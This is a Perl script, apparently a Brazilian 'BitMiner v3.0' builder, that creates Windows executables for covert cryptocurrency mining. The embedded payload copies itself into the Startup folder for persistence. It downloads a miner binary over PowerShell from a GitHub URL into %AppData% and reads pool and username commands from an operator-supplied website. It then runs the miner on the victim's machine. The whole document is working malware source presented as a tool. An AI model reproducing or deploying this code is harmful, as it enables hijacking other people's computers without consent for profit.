#!/usr/bin/perl -w
use Term::ANSIColor 'color';
use Archive::Zip;
use LWP::Simple 'getstore';
use Config;

$SIG{INT} = sub {sleep 1.5 and exit 0};
if($Config{osname} =~ m/win/i){
  system('cls');
}else{
  system('clear');
}

print color('RED');
print <<"ART";
\n/\\
||_____-----_____-----_____
||   O                  O  \\
||    O\\\\    _    //O    /
||       \\\\ /   \\//        \\
||         |_O O_|         /        Valeu, Nyx !
||          ^ | ^          \\
||        // UUU \\\\        /
||    O//            \\\\O   \\
||   O                  O  /
||_____-----_____-----_____\\
||
ART
print color('reset');
print "\n\t", 'BitMiner v3.0', "\n";

if(@ARGV){
  if(@ARGV > 1){
    print "\n[", color('YELLOW'),'!',color('reset'), '] Somente um parametro por vez permitido !', "\n";
    sleep 3;
    exit 0;
  }
  foreach(@ARGV){
    if($_ =~ m/^--install-compiler$/i){
      my $zip = undef;
      print "\n[", color('YELLOW'),'!',color('reset'), '] Baixando o compilador', color('RED'),'...',color('reset'), "\n";
      getstore('http://indigostar.com/download/perl2exe-24.00-win.zip', 'perl2exe.zip');
      $zip = Archive::Zip->new;
      $zip->read('perl2exe.zip');
      $zip->extractTree();
      unlink 'perl2exe.zip';
      rename 'perl2exe-24.00-win', 'perl2exe';
      print "\n[", color('YELLOW'),'!',color('reset'), '] Sucesso !', "\n";
      sleep 3;
      exit 0;
    }
    else{
      print "\n[", color('YELLOW'),'!',color('reset'), '] Parametro invalido !', "\n";
    }
  }
}else{
  print "\n[", color('YELLOW'),'!',color('reset'), '] Digite seu site: ';
  my $www = <STDIN>;
  chomp $www if $www;
  until($www){
    print '[', color('YELLOW'),'!',color("reset"), '] Digite seu site: ';
    $www = <STDIN>;
    chomp $www if $www;
  }
  &generate($www);
}

sub generate{
  if(! -e 'perl2exe'){
    print "\n[", color('YELLOW'),'!',color("reset"), '] Nenhum compilador encontrado, execute $0 --install-compiler !', "\n";
    sleep 3;
    exit 0;   
  }
  unless($_[0]){
    print "\n[", color('YELLOW'),'!',color("reset"), '] Ocorreu um erro, tente novamente !', "\n";
    sleep 3;
    exit 0;
  }
  print "\n";
  $_[0] = 'http://' . $_[0] if $_[0] !~ m/^(http|https):\/\//;
  $_[0] =~ s/\/$//;
  open(OUTPUT, '>', 'output.pl');
  print OUTPUT 
'#!/usr/bin/perl -w
use LWP::UserAgent \'get\', \'agent\', \'decoded_content\';
use File::Basename \'basename\';
use Config;
#perl2exe_include LWP::UserAgent
#perl2exe_include File::Basename
#perl2exe_include Config

$0 = basename($0);

while(1){
  while(qx/dir %AppData%\\\\Microsoft\\\\Windows\\\\"Start Menu"\\\\Programs\\\\Startup/ !~ m/$0/){
    system(\'copy \' . $0 . \' %AppData%\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup\');
  }
  while(qx/dir %AppData%/ !~ m/NsCpuCNMiner\.exe/){
    if($Config{archname} =~ m/x86_64/ || $Config{archname} =~ m/x64/){
      system(\'powershell -command "$client = new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");"\');
    }else{
      system(\'powershell -command "$client = new-object System.Net.WebClient;$client.DownloadFile(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");"\');
    }
    if(-e \'NsCpuCNMiner.exe\'){
      system(\'move NsCpuCNMiner.exe %AppData%\');
    }
  }
  system(\'powershell -command "$client = new-object System.Net.WebClient;$client.DownloadFile(\"' . $_[0] . '\", \"content.txt\")"\');
  my @type = `type content.txt`;
  if(scalar(@type) =~ m/miner<(.+),(.+)>/i){
    system("%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp://$1 -u $2 -p x");
  }
}';
  close(OUTPUT);
  if($^V eq 'v5.24.1'){
    system('perl2exe\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl');  
    if(-e 'output_32.exe'){
      print "\n", 'Executavel de 32 bits gerado com sucesso !', "\n\n";
    }else{
      print "\n", 'Executavel de 32 bits nao foi gerado !', "\n\n";
    }
    system('perl2exe\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl');
    if(-e 'output_64.exe'){
      print "\n", 'Executavel de 64 bits gerado com sucesso !', "\n";
    }else{
      print "\n", 'Executavel de 64 bits nao foi gerado !', "\n";
    }
  }
  elsif($^V eq 'v5.24.0'){
    system('perl2exe\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl');
    if(-e 'output_32.exe'){
      print "\n", 'Executavel de 32 bits gerado com sucesso !', "\n\n";
    }else{
      print "\n", 'Executavel de 32 bits nao foi gerado !', "\n\n";
    }
    system('perl2exe\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl');
    if(-e 'output_64.exe'){
      print "\n", 'Executavel de 64 bits gerado com sucesso !', "\n";
    }else{
      print "\n", 'Executavel de 64 bits nao foi gerado !', "\n";
    }
  }
  else{
    print "\n[", color('YELLOW'),'!',color('reset'), '] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !', "\n";
  }
  unlink 'output.pl';
  sleep 1.5;
}
